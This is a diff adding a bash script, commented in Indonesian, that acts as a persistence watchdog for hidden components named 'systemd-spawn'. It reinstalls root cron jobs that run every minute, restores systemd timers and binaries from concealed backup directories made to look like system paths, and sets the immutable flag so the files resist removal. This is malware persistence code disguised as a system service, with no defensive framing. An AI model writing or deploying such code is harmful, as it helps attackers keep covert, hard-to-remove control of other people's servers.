@@ -1,0 +1,74 @@
+
+#!/bin/bash
+# Monitor semua komponen - Versi Premium
+
+# Lokasi backup
+BACKUP_DIRS=("/var/tmp/.systemd-backup" "/opt/.config/.cache/.systemd" "/usr/share/.misc/.backup")
+
+# 1. CEK CRON DI 3 TEMPAT
+CRON_FILES=("/etc/cron.d/systemd-spawn" "/etc/crontab" "/var/spool/cron/crontabs/root")
+for CRON_FILE in "${CRON_FILES[@]}"; do
+    if [ ! -f "$CRON_FILE" ] || ! grep -q "systemd-spawn" "$CRON_FILE" 2>/dev/null; then
+        echo "* * * * * root /usr/local/lib/.systemd/systemd-spawn" >> /etc/crontab 2>/dev/null
+        echo "* * * * * root /usr/local/lib/.systemd/systemd-spawn" > /etc/cron.d/systemd-spawn 2>/dev/null
+        echo "* * * * * /usr/local/lib/.systemd/systemd-spawn" >> /var/spool/cron/crontabs/root 2>/dev/null
+    fi
+done
+
+# 2. CEK TIMER DI 3 NAMA
+TIMER_NAMES=("systemd-spawn-30" "systemd-spawn-45" "systemd-spawn-60")
+for TIMER in "${TIMER_NAMES[@]}"; do
+    if [ ! -f "/etc/systemd/system/$TIMER.timer" ]; then
+        # Cek di backup
+        for DIR in "${BACKUP_DIRS[@]}"; do
+            if [ -f "$DIR/$TIMER.timer" ]; then
+                cp "$DIR/$TIMER.timer" "/etc/systemd/system/"
+                cp "$DIR/$TIMER.service" "/etc/systemd/system/"
+                systemctl daemon-reload
+                systemctl enable "$TIMER.timer"
+                systemctl start "$TIMER.timer"
+                chattr +i "/etc/systemd/system/$TIMER."* 2>/dev/null
+                break
+            fi
+        done
+    fi
+done
+
+# 3. CEK SCRIPT UTAMA ILANG
+if [ ! -f /usr/local/lib/.systemd/systemd-spawn ]; then
+    for DIR in "${BACKUP_DIRS[@]}"; do
+        if [ -f "$DIR/systemd-spawn" ]; then
+            cp "$DIR/systemd-spawn" /usr/local/lib/.systemd/
+            chmod +x /usr/local/lib/.systemd/systemd-spawn
+            break
+        fi
+    done
+fi
+
+# 4. CEK SCRIPT MONITOR ILANG
+if [ ! -f /usr/local/lib/.systemd/systemd-spawn-monitor ]; then
+    for DIR in "${BACKUP_DIRS[@]}"; do
+        if [ -f "$DIR/systemd-spawn-monitor" ]; then
+            cp "$DIR/systemd-spawn-monitor" /usr/local/lib/.systemd/
+            chmod +x /usr/local/lib/.systemd/systemd-spawn-monitor
+            break
+        fi
+    done
+fi
+
+# 5. PASTIKAN IMMUTABLE FLAG TETEP ADA
+FILES_TO_PROTECT=(
+    "/etc/cron.d/systemd-spawn"
+    "/etc/crontab"
+    "/var/spool/cron/crontabs/root"
+    "/usr/local/lib/.systemd/systemd-spawn"
+    "/usr/local/lib/.systemd/systemd-spawn-monitor"
+)
+
+for FILE in "${FILES_TO_PROTECT[@]}"; do
+    if [ -f "$FILE" ]; then
+        chattr +i "$FILE" 2>/dev/null
+    fi
+done
+
+exit 0
